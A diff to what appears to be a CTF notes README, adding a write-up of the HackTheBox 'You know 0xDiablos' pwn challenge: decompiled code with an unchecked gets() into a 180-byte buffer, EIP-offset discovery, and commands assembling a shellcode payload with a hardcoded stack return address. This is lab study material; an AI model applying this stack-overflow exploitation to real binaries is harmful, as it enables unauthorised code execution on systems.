@@ -2,6 +2,62 @@
 
 - Added HTB cyber-apocalypse post-CTF analysis (check out `./cyberapocalypse`) 
 
+## Pwn
+
+### You Know 0xDiaboles
+
+[Diablos](https://app.hackthebox.eu/challenges/You-know-0xDiablos)
+
+**Challenge info**: I missed my flag
+
+```c
+void vuln(void)
+
+{
+  char local_bc [180];
+  
+  gets(local_bc);
+  puts(local_bc);
+  return;
+}
+
+undefined4 main(void)
+
+{
+  __gid_t __rgid;
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  __rgid = getegid();
+  setresgid(__rgid,__rgid,__rgid);
+  puts("You know who are 0xDiablos: ");
+  vuln();
+  return 0;
+}
+
+```
+- We have a buffer overflow > 180 bytes. Security: Partial RELRO, NX disabled, PIE disabled. This means shellcode can be injected; and address space randomisation isn't there.
+
+```py
+python2 -c "print('A'*180 + 'BBBBCCCCDDDD')"
+```
+
+It turns out that:
+
+```s
+EBX = BBBB
+EBP = CCCC
+EIP = DDDD
+```
+
+- So that's how EIP can be overridden. Since stack is executable, if EIP is overriden with the address of the buffer (where shellcode shall be injected), it will execute. Since PIE is disabled, stack will always will be at the same location. So hardcode it :)
+
+- And the buffer at stack starts at 0xffffcf70 with EIP at 0xffffd020. 
+
+```s
+cat shellcode-raw > payload
+python2 -c "print('BBBBCCC' + '\x70\xcf\xff\xff');" >> payload
+```
+
 ## Web
 
 ### Emdee five for life 
